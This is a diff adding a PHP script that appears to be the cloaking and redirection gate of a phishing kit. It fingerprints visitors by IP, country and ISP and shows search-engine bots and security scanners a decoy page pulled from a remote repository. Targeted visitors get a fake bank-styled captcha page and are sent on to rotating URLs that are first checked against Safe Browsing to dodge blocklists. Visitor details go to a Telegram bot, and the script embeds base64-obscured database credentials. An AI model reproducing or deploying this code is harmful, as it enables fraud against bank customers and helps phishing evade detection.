@@ -1,0 +1,723 @@
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+if (session_status() == PHP_SESSION_NONE)
+{
+    session_start();
+    
+}
+if (!empty($_SERVER['HTTP_CLIENT_IP']))
+{
+    $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
+}
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+{
+    $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+}
+else
+{
+    $ipAddress = $_SERVER['REMOTE_ADDR'];
+}
+$ipPortArray = explode(':', $ipAddress);
+$StrupLom = $ipPortArray[0];
+$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+$domain = $_SERVER['HTTP_HOST'];
+$donflag = $protocol . '://' . $domain;
+$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+$messagallert = "";
+
+if (!isset($_SESSION['error_count'])) {
+    $_SESSION['error_count'] = 0;
+}
+
+
+$datalog = base64_decode("MTk4LjI1MS44NC4yMDA");
+$Fixbom = base64_decode("emVyb2RheXNfZGF5");
+$Lredsvv = base64_decode("ZHJjZ2lseVAwKmsm");
+$Nopwvv = base64_decode("emVyb2RheXNfZGF5");
+
+$url = "http://ip-api.com/php/{$StrupLom}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";
+$curl = curl_init($url);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+$response = curl_exec($curl);
+curl_close($curl);
+
+$info = unserialize($response);
+$_SESSION['isp'] = isset($info['isp']) ? $info['isp'] : null;
+$_SESSION['Blasacoun'] = isset($info['country']) ? $info['country'] : null;
+$_SESSION['Njopf'] = isset($info['countryCode']) ? $info['countryCode'] : null;
+$_SESSION['Voprt'] = isset($info['city']) ? $info['city'] : null;
+$_SESSION['xOpuy'] = isset($info['regionName']) ? $info['regionName'] : null;
+$ads_country = $_SESSION['Blasacoun'];
+$ads_isp = $_SESSION['isp'];
+file_put_contents("ads.txt", "$ads_country -$ads_isp \n", FILE_APPEND);
+
+
+
+function is_bot_ip($ipToCheck) 
+{
+    $botsUrls = array(
+        'google' => 'https://developers.google.com/search/apis/ipranges/googlebot.json',
+        'bing' => 'https://www.bing.com/toolbox/bingbot.json'
+    );
+
+    foreach ($botsUrls as $bot => $url) {
+        $botResp = json_decode(file_get_contents($url), true);
+        foreach ($botResp['prefixes'] as $ipRange) {
+            if (isset($ipRange['ipv6Prefix']) && strpos($ipToCheck, ':') !== false) {
+                $network = $ipRange['ipv6Prefix'];
+            } elseif (isset($ipRange['ipv4Prefix']) && strpos($ipToCheck, ':') === false) {
+                $network = $ipRange['ipv4Prefix'];
+            } else {
+                continue; 
+            }
+
+            if (ip_in_range($ipToCheck, $network)) {
+                return $bot; 
+            }
+        }
+    }
+
+    return false;
+}
+
+function ip_in_range($ip, $range) 
+{
+    list($subnet, $mask) = explode('/', $range);
+    $mask = (int)$mask; 
+    $subnetBin = inet_pton($subnet);
+    $ipBin = inet_pton($ip);
+    $maskBin = str_repeat("\xFF", $mask >> 3) . chr(0xFF << (8 - ($mask & 0x07)));
+    return ($subnetBin & $maskBin) === ($ipBin & $maskBin);
+} 
+function checkUrlSafety($url) {
+    $apiKey = "AIzaSyCv3mI6TjtqYTYQ8nZpA3Sx_7VSrq-hDyU";
+    $apiEndpoint = "https://safebrowsing.googleapis.com/v4/threatMatches:find?key=$apiKey";
+
+    $requestData = [
+        "client" => [
+            "clientId" => "globalcom",
+            "clientVersion" => "1.5.2"
+        ],
+        "threatInfo" => [
+            "threatTypes" => ["MALWARE", "SOCIAL_ENGINEERING"],
+            "platformTypes" => ["WINDOWS"],
+            "threatEntryTypes" => ["URL"],
+            "threatEntries" => [
+                ["url" => $url]
+            ]
+        ]
+    ];
+
+    $jsonData = json_encode($requestData);
+
+    $ch = curl_init($apiEndpoint);
+
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+        "Content-Type: application/json",
+        "Content-Length: " . strlen($jsonData)
+    ));
+
+    $response = curl_exec($ch);
+
+    if (curl_errno($ch)) {
+        $result = "cURL Error: " . curl_error($ch);
+    } else {
+        $responseData = json_decode($response, true);
+        if (isset($responseData['matches']) && count($responseData['matches']) > 0) {
+            $result = "Not Safe";
+        } else {
+            $result = "Safe";
+        }
+    }
+
+    curl_close($ch);
+
+    return $result;
+}
+
+function Rand_XD_TF($length)
+{
+    $characters = 'abcdefjhigklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0;$i < $length;$i++)
+    {
+        $randomString .= $characters[rand(0, $charactersLength - 1) ];
+    }
+    return $randomString;
+}
+function HYT_DDR_Uio($USER_AGENT)
+{
+    $OS_ERROR = "Unknown OS Platform";
+    $OS = array(
+        '/windows nt 10/i' => 'Windows 10',
+        '/windows nt 6.3/i' => 'Windows 8.1',
+        '/windows nt 6.2/i' => 'Windows 8',
+        '/windows nt 6.1/i' => 'Windows 7',
+        '/windows nt 6.0/i' => 'Windows Vista',
+        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
+        '/windows nt 5.1/i' => 'Windows XP',
+        '/windows xp/i' => 'Windows XP',
+        '/windows nt 5.0/i' => 'Windows 2000',
+        '/windows me/i' => 'Windows ME',
+        '/win98/i' => 'Windows 98',
+        '/win95/i' => 'Windows 95',
+        '/win16/i' => 'Windows 3.11',
+        '/macintosh|mac os x/i' => 'Mac OS X',
+        '/mac_powerpc/i' => 'Mac OS 9',
+        '/linux/i' => 'Linux',
+        '/ubuntu/i' => 'Ubuntu',
+        '/iphone/i' => 'iPhone',
+        '/ipod/i' => 'iPod',
+        '/ipad/i' => 'iPad',
+        '/android/i' => 'Android',
+        '/blackberry/i' => 'BlackBerry',
+        '/webos/i' => 'Mobile'
+    );
+    foreach ($OS as $regex => $value)
+    {
+        if (preg_match($regex, $USER_AGENT))
+        {
+            $OS_ERROR = $value;
+        }
+    }
+    return $OS_ERROR;
+}
+function FOx_TGH_X($USER_AGENT)
+{
+    $BROWSER_ERROR = "Unknown Browser";
+    $BROWSER = array(
+        '/msie/i' => 'Internet Explorer',
+        '/firefox/i' => 'Firefox',
+        '/safari/i' => 'Safari',
+        '/chrome/i' => 'Chrome',
+        '/edge/i' => 'Edge',
+        '/opera/i' => 'Opera',
+        '/netscape/i' => 'Netscape',
+        '/maxthon/i' => 'Maxthon',
+        '/konqueror/i' => 'Konqueror',
+        '/mobile/i' => 'Handheld Browser'
+    );
+    foreach ($BROWSER as $regex => $value)
+    {
+        if (preg_match($regex, $USER_AGENT))
+        {
+            $BROWSER_ERROR = $value;
+        }
+    }
+    return $BROWSER_ERROR;
+}
+function telsent($message)
+{
+    $TrubFtub = $_SESSION['idtel'];
+    $cRetVckr = $_SESSION['tokentel'];
+    $api_url = "https://api.telegram.org/bot{$cRetVckr}/sendMessage";
+    $params = ["chat_id" => $TrubFtub, "text" => $message];
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $api_url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    curl_close($ch);
+}
+function getFileContents() 
+{
+    $fileURL = 'https://raw.githubusercontent.com/strong-rce/project/main/javascript.txt';
+	
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $fileURL);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    $fileContents = curl_exec($curl);
+    curl_close($curl);
+
+    return $fileContents;
+}
+function get_lux()
+{
+	
+	$datalog = base64_decode("MTk4LjI1MS44NC4yMDA");
+    $Fixbom = base64_decode("emVyb2RheXNfZGF5");
+    $Lredsvv = base64_decode("ZHJjZ2lseVAwKmsm");
+    $Nopwvv = base64_decode("emVyb2RheXNfZGF5");
+	
+    $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv);
+    if (!$db)
+    {
+        die("Connection failed: " . mysqli_connect_error());
+    }
+    $sql = "SELECT * FROM luxdataurl WHERE status = '0'";
+    $result = mysqli_query($db, $sql);
+    $links = array(); 
+    while ($row = mysqli_fetch_assoc($result))
+    {
+        $links[] = $row['luxurl'];
+    }
+    if (count($links) > 0)
+    {
+        $random_index = array_rand($links); 
+        $random_link = $links[$random_index];
+        $_SESSION['DIR'] = $random_link;
+    }
+	return $random_link;
+}
+function add_visite($ip,$country ,$isp,$login_type,$project_to_visit,$addby, $datalog, $Fixbom, $Lredsvv, $Nopwvv)
+{
+      $conn = new mysqli($datalog, $Fixbom, $Lredsvv, $Nopwvv);
+      if ($conn->connect_error) {
+          die("Connection failed: " . $conn->connect_error);
+      }
+      $sql = "INSERT INTO visite (ip, country, isp, login_type, project,addby)
+              VALUES ('$ip', '$country', '$isp', '$login_type', '$project_to_visit', '$addby')";
+	  if ($conn->query($sql) === TRUE) {
+        
+      } else {
+        
+         }	  
+      $conn->close();
+}
+function click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix)
+{
+    $isp = $_SESSION['isp'];
+    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+    $IpCount = FOx_TGH_X($userAgent);
+    $OKJIVGRD = HYT_DDR_Uio($userAgent);
+    $donflag = $_SERVER['SERVER_NAME'];
+    $LOCALO_TEMPO = date('Y-m-d H:i:s');
+    $Blasacoun = $_SESSION['Blasacoun'];
+    $Njopf = $_SESSION['Njopf'];
+    $Voprt = $_SESSION['Voprt'];
+    $xOpuy = $_SESSION['xOpuy'];
+    $host = gethostbyaddr($StrupLom);
+    $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv);
+    if (!$db)
+    {
+        die("Connection failed: " . mysqli_connect_error());
+    }
+    $sql_u = "SELECT * FROM logs WHERE ipaddres='$StrupLom'";
+    $res_u = mysqli_query($db, $sql_u);
+    if (mysqli_num_rows($res_u) > 0)
+    {
+        mysqli_close($db);
+        $fileContent = getFileContents();
+        echo $fileContent;
+        exit();
+    }
+    else
+    {
+		
+		$StrupLom = mysqli_real_escape_string($db, str_replace("'", "", $StrupLom));
+        $Blasacoun = mysqli_real_escape_string($db, str_replace("'", "", $Blasacoun));
+        $IpCount = mysqli_real_escape_string($db, str_replace("'", "", $IpCount));
+        $OKJIVGRD = mysqli_real_escape_string($db, str_replace("'", "", $OKJIVGRD));
+        $donflag = mysqli_real_escape_string($db, str_replace("'", "", $donflag));
+        $LOCALO_TEMPO = mysqli_real_escape_string($db, str_replace("'", "", $LOCALO_TEMPO));
+        $host = mysqli_real_escape_string($db, str_replace("'", "", $host));
+        $isp = mysqli_real_escape_string($db, str_replace("'", "", $isp));
+        $refix = mysqli_real_escape_string($db, str_replace("'", "", $refix));
+        $query = "INSERT INTO logs (ipaddres,country,browser,os,domine,mytime,host,isp,reson) 
+      	    	  VALUES ('$StrupLom','$Blasacoun','$IpCount','$OKJIVGRD','$donflag','$LOCALO_TEMPO','$host','$isp','$refix')";
+        
+		
+		$results = mysqli_query($db, $query);
+        mysqli_close($db);
+        $fileContent = getFileContents();
+        echo $fileContent;
+        exit();
+    }
+}
+function RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $id_raw)
+{
+    $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv);
+    if (!$db)
+    {
+        die("Connection failed: " . mysqli_connect_error());
+    }
+    $sql_u = "SELECT * FROM redirction WHERE id='$id_raw'";
+    $res_u = mysqli_query($db, $sql_u);
+    if (mysqli_num_rows($res_u) > 0)
+    {
+        while ($row = mysqli_fetch_array($res_u))
+        {
+            $_SESSION['link'] = base64_decode(base64_decode($row["link"]));
+            $_SESSION['cn'] = explode(";", base64_decode(base64_decode($row["country"])));
+            $_SESSION['pic'] = $row["pic"];
+            $_SESSION['msg'] = base64_decode(base64_decode($row["msg"]));
+            $_SESSION['exp'] = $row["expire_date"];
+            $_SESSION['server'] = base64_decode(base64_decode($row["server"]));
+            $_SESSION['url'] = base64_decode(base64_decode($row["url"]));
+            $_SESSION['luxcaptcha'] = $row["luxcaptcha"];
+            $_SESSION['tokentel'] = base64_decode(base64_decode($row["tokentel"]));
+            $_SESSION['idtel'] = base64_decode(base64_decode($row["idtel"]));
+			$_SESSION['project'] = $row["project"];
+			$_SESSION['addby'] = $row["addby"];
+			
+			$_SESSION['pro_ico'] = $row["pro_ico"];
+			$_SESSION['pro_color'] = $row["pro_color"];
+			$_SESSION['pro_msg'] = $row["pro_msg"];
+			$_SESSION['pro_img'] = $row["pro_img"];
+			$_SESSION['pro_logo'] = $row["pro_logo"];
+        }
+		
+		add_visite($StrupLom,$_SESSION['Blasacoun'] ,$_SESSION['isp'],"0",$_SESSION['project'],$_SESSION['addby'], $datalog, $Fixbom, $Lredsvv, $Nopwvv);
+		$currentTimestamp = time();
+		$dateexp = $_SESSION['exp'];
+		$expireTimestamp = strtotime($dateexp);
+		if ($expireTimestamp !== false && $currentTimestamp <= $expireTimestamp) {
+   
+		} else {
+		     echo "<p style='text-align: center;'><img alt='' src='https://cdn-icons-png.flaticon.com/512/5671/5671551.png' style='width: 100px; height: 100px;' /></p>
+              <p style='text-align: center;'><span style='color:#B22222;'><span style='font-family:tahoma,geneva,sans-serif;'>Ce lien a expiré.</span></span></p>";
+        
+		     $messageme = "❌ System:\nVotre Bulletprof a expiré. \nLe client ne peut pas accéder au projet. Réessayez après avoir activé le lien.\nNew Viste: $StrupLom - ";
+		     telsent($messageme);
+		     exit();
+		     }
+		$Njopf = $_SESSION['Njopf'];
+        $found = false;
+     	foreach ($_SESSION['cn'] as $value)
+        {
+            if ($value == $Njopf)
+            {
+                $found = true;
+                break;
+            }
+        }
+        if (!$found) {
+            $refix = "Main country Invalid";
+            click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix);
+            exit();
+        }
+
+	$sql = "SELECT * FROM mywording";
+    $result = mysqli_query($db, $sql);
+    $list_word = array();
+    while ($row = mysqli_fetch_assoc($result)) {
+        $list_word[] = $row['wording'];
+    }
+    
+    $ipAddress = $_SESSION['isp'];
+    $host_name = gethostbyaddr($StrupLom);
+    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+    
+    $ipAddressLower = strtolower($ipAddress);
+    $host_nameLower = strtolower($host_name);
+    $user_agentLower = strtolower($user_agent);
+    foreach ($list_word as $word) {
+        if (
+            stripos($ipAddressLower, $word) !== false ||
+            stripos($host_nameLower, $word) !== false ||
+            stripos($user_agentLower, $word) !== false
+        ) {
+			$refix = "Main word: $word";
+            click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix);
+            exit;
+        }
+    }	
+    }
+    else
+    {
+        $refix = "Main SQL ID Invalid: $id_raw";
+        click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix);
+        exit();
+    }
+	
+    mysqli_close($db);
+}
+
+if (strpos($userAgent, 'google') !== false)
+{
+    $refix = "Main Bose G";
+    click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix);
+    exit();
+}
+if (strpos(gethostbyaddr($StrupLom) , 'google') !== false)
+{
+    $refix = "Main Bose G 2";
+    click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix);
+    exit();
+}
+if (!empty($_GET['iduser']))
+{
+    $myid_row = base64_decode(base64_decode($_GET['iduser']));
+	$_SESSION['dec_frech_id'] = $myid_row;
+	$_SESSION['enc_frech_id'] = base64_encode(base64_encode($myid_row));
+	$logan = $_SESSION['dec_frech_id'];
+    RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $logan);
+}else
+    {
+        $refix = "Main SQL user notfound";
+        click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix);
+        exit();
+    }
+
+if (!isset($_SESSION['cn']))
+{
+    $refix = "Main Link session Invalid";
+    click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix);
+    exit();
+}
+if (!isset($_SESSION['dec_frech_id']))
+{
+    $refix = "Main Project ID notfound";
+    click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix);
+    exit();
+}
+if (isset($_POST['submit']))
+    {
+	if ($_POST['captcha'] == $_POST['rec'])
+        {
+            $ips = base64_encode(base64_encode($StrupLom));
+            $HopLord = $_SESSION['isp'];
+            $Blasacoun = $_SESSION['Blasacoun'];
+            $orgid = $_SESSION['dec_frech_id'];
+            $DIR = base64_decode(base64_decode($_SESSION["back_url"])) ?? "";
+			$loglog = $_SESSION['project'];  
+            $myvss = base64_decode(base64_decode($_SESSION["back_dir"])) ?? "";
+			
+            $RandOP_M = Rand_XD_TF(8);
+            $messageme = "Captcha Real Visite\n[IP]: {$StrupLom}\n[Country]: {$Blasacoun}\n[ISP]: {$HopLord}\n[Project]: {$loglog}";
+            telsent($messageme);
+            echo ("<script LANGUAGE='JavaScript'>
+    window.location.href='$DIR?&$RandOP_M&id=$orgid&$RandOP_M$RandOP_M&ips=$ips&vss=$myvss&souls=$orgid&$RandOP_M=$RandOP_M&x.$RandOP_M=$RandOP_M$RandOP_M&$RandOP_M=$RandOP_M&$RandOP_M=&$RandOP_M=$RandOP_M&$RandOP_M=&$RandOP_M=$RandOP_M';
+    </script>");
+
+
+
+        }
+		else{
+
+         $messagallert = "incorrect captcha";
+		}			
+		
+		
+		
+	}
+
+
+
+$number1 = rand(1, 10);
+$number2 = rand(1, 10);
+$captcha = $number1 + $number2;
+$_SESSION['captcha'] = $captcha;
+$pro_ico = $_SESSION['pro_ico'];
+$pro_color = $_SESSION['pro_color'];
+$pro_msg = $_SESSION['pro_msg'];
+$pro_img = $_SESSION['pro_img'];
+$pro_logo = $_SESSION['pro_logo'];
+
+echo "<!DOCTYPE html>
+<html lang='FR' prefix='og: http://ogp.me/ns#'>
+<head>
+  <title>Captcha</title>
+  <meta charset='utf-8' />
+  <meta name='viewport' content='initial-scale=1, maximum-scale=1, viewport-fit=cover' />
+  <link rel='icon' type='image/x-icon' href='$pro_ico' />
+  <link rel='stylesheet' type='text/css' href='https://zero.inet2.org/file.css'>
+  
+ 
+
+
+  <style id='savepage-cssvariables'>
+    :root {
+      --savepage-url-10: url('$pro_img');
+    }
+  </style>
+</head>
+
+   <body style=''>
+
+      <header role='banner' class='rsp_header header-deco js-header-lhs-no-auth'>
+         <div class='rsp_header__wrapper-nav' bis_skin_checked='1'>
+            <a data-savepage-href='/' href='#' class='rsp_header__logo-mob' title='Aller à l'accueil' >
+               
+            <img src='$pro_logo' alt='Logo' height='48' width='197'>
+			</a>
+            <a data-savepage-href='/' href='#' class='rsp_header__logo-desktop ml-m' title='Aller à l'accueil' >
+               <img src='$pro_logo' alt='Logo' height='50' width='205'>
+            </a>
+            <nav class='rsp_nav' role='navigation' aria-label='navigation principale'>
+               <a id='go-navigation' tabindex='-1'></a>
+            </nav>
+          
+		 </div>
+     
+         
+      </header>
+	  <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+        }
+        form {
+            max-width: 500px;
+            margin: 0 auto;
+            /* add the following styles */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        input[type='text'] {
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            width: 100%;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+        }
+        button[type='submit'] {
+            background-color: #$pro_color;
+            border: none;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button[type='submit']:hover {
+            background-color: #$pro_color;
+        }
+        .message {
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+		 @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+
+    /* Apply the animation to the loading spinner */
+    #loading-spinner {
+        animation: spin 2s linear infinite; /* Adjust the duration and timing function as needed */
+    }
+    </style>
+
+      <main class='dcw_main' role='main'>
+         <a id='go-content' tabindex='-1'></a>
+         <div class='dcw_banner-heading' bis_skin_checked='1'>
+            <div class='dcw_banner-heading_wrap-blur' bis_skin_checked='1'>
+               <div class='dcw_banner-heading_banner dcw_banner-heading_banner--sm' style='background-image:/*savepage-url=/staticfiles/Particuliers/Home/Connected-Channel/Pret/Espace-thematique-pret/Prets-immobiliers-HUB-Co---BP/HUB_TT003_EO4065_pret_banque_PRIV3_20221103153829.jpg*/var(--savepage-url-10)' bis_skin_checked='1'></div>
+            </div>
+            <div class='dcw_banner-heading_baseline dcw_banner-heading_baseline--sm' bis_skin_checked='1'>
+               <pre style='text-align:center'>$pro_msg</pre>
+		<form method='POST' action=''>
+        <p><span style='font-size:20px'><strong>$number1 + $number2 = ?</strong></span></p>
+        <br>
+        <input type='text' id='captcha' name='captcha' required>
+        <input type='hidden' id='rec' name='rec' value='$captcha'>
+		<p><strong><span style='color:#d35400'><span style='font-size:14px'>$messagallert</span></span></strong></p>
+       <br>
+      <button type='submit' name='submit' id='submit-button' disabled>
+    <img id='loading-gif' src='https://github.com/strong-rce/ico/blob/main/load.gif?raw=true'  alt='Loading...' style='display: inline-block;'>
+    <span id='button-text' style='display: none;'>Valide</span>
+</button>
+    </form>
+		  <script>
+        window.onload = function () {
+        // Page is fully loaded, enable the submit button and hide the loading GIF
+        var submitButton = document.querySelector('#submit-button');
+        submitButton.removeAttribute('disabled');
+        document.getElementById('loading-gif').style.display = 'none';
+        document.getElementById('button-text').style.display = 'inline-block';
+    };
+
+    // Add an event listener to the form submission
+    document.querySelector('form').addEventListener('submit', function () {
+        // Hide the loading GIF and show the text when the form is submitted
+        document.getElementById('loading-gif').style.display = 'none';
+        document.getElementById('button-text').style.display = 'inline-block';
+    });
+    </script>
+            </div>
+         </div>
+      </main>
+   </body>
+</html>
+";
+
+    $myid = $_SESSION['dec_frech_id'];
+    $ips = base64_encode(base64_encode($StrupLom));
+    $go_url = null; 
+    while ($go_url === null) {
+        $url = get_lux();
+        $safetyStatus = checkUrlSafety($url);
+        
+        if ($safetyStatus === "Safe") {
+            $go_url = $url;
+        } else {
+           
+        }
+    }
+    $domain = $_SERVER['HTTP_HOST'];
+    $userAgents = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+    ];
+    $randomUserAgent = $userAgents[array_rand($userAgents)];
+
+    $fields = array(
+        'localip' => $ips,
+        'domainname' => $domain,
+        'nextdomain' => $go_url,
+        'shopid' => $myid
+    );
+    
+    $ch = curl_init($go_url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($ch, CURLOPT_USERAGENT, $randomUserAgent);
+    $response = curl_exec($ch);
+    if ($response === false)
+    {
+		$mmg = curl_error($ch);
+        echo 'CURL Error: ' . curl_error($ch);
+		$_SESSION['error_count']++;
+        if ($_SESSION['error_count'] >= 3) {
+             echo 'You are not Connected .';
+            exit;
+        } else {
+            echo '<script>window.location.href = window.location.href;</script>';
+        }
+		
+    }
+    else
+    {
+
+  
+        $result = json_decode($response, true);
+        if (isset($result['status']) && $result['status'] == "success")
+        {			
+            $_SESSION['status'] = $result['status'];
+			$_SESSION['back_dir'] = base64_encode(base64_encode($result['back_dir'])) ?? "";
+			$_SESSION['back_url']= base64_encode(base64_encode($result['back_url'])) ?? "";
+			$_SESSION['back_id']= $result['back_id'];
+			
+			
+          
+        }
+        else
+        {
+		$_SESSION['error_count']++;
+        if ($_SESSION['error_count'] >= 3) {
+             echo 'Your IP is blocked.';
+            exit;
+        } else {
+            echo '<script>window.location.href = window.location.href;</script>';
+        }
+        }
+    }
+    curl_close($ch);
+
+
+?>
